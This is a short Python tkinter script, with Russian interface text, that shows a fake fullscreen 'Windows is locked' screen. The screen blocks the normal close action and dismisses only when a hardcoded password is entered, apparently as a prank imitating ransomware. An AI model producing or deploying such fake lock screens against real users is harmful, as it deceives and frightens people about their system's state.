from tkinter import *

def disable_event():
    pass

def clicked():
    if txt.get() == password:
        window.destroy()

password = "1234"

window = Tk()
window.title("ща обновим тебе шиндовс")
window.attributes("-fullscreen", True, "-topmost",True)
window.configure(bg='black')
window.grab_release()
window.protocol('WM_DELETE_WINDOW', disable_event) # обработчик закрытия окна

lbl = Label(window, text="WINDOWS заблокирован")
lbl.grid(column=0, row=0)  #можно закрыть alt+f4
lbl.configure(bg="black", fg="red", font="Arial 50")
lbl.place(x = 500)

btn = Button(window, text="отправить", command=clicked)
btn.grid(column=2, row=0)
btn.configure(font = "Arial 50")
btn.place(x = 750, y = 600)

entry_password = Label(window, text = "введи пароль")
entry_password.place(x=800, y = 500)
entry_password.configure(bg="black",fg="white", font = "Sans 20")

txt = Entry(window,width=50)
txt.grid(column=1, row=0)
txt.place(x=550, y=500)
txt.configure(font="Sans 20")

window.mainloop()
